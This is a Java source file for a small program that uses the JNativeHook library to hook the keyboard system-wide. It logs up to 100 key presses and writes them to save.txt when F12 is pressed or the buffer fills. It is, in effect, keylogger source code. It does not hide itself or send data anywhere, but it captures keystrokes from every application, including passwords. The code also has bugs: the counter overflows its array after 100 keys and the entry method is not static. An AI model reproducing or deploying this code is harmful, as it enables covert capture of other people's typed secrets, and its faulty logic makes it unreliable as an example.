/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package KeyReader;
import java.io.*;
import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author GoD
 */
public class Model2 implements NativeKeyListener{ 
    String output = "";
    String [] str = new String[100];
    int i = 0;
    public void main(){
        try{
            GlobalScreen.registerNativeHook();
        }
        catch(Exception e){
            e.printStackTrace();
        }
        GlobalScreen.getInstance().addNativeKeyListener(new Model2());
    }
    
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        str[i] = NativeKeyEvent.getKeyText(e.getKeyCode());
        i = i + 1;
        if (e.getKeyCode() == NativeKeyEvent.VK_F12 || i >= str.length) {
            for (int j = 0; j < str.length; j++) {
                if (str[j] != null) {
                    output += str[j] + " ";
                }
            }
            try (FileWriter writer = new FileWriter("save.txt", false)) {
                writer.write(output);
            } catch (IOException ex) {
                System.out.println(ex.getMessage());
            }
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
        
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
        
    }
    
}

